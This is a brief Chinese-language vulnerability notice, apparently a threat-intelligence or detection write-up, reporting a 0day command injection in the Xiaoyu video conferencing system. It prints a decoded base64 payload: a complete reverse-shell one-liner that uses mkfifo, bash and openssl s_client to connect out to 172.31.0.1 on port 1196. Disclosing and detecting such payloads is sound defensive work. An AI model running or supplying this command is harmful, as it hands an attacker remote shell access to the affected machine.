# 小鱼易连视频会议系统存在0day
漏洞概述
----

小鱼视频会议系统存在命令注入攻击

特征发现：匹配规则base64编码  
解码特征（存在反弹shell）：

    mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect 172.31.0.1:1196 > /tmp/s;rm -f /tmp/s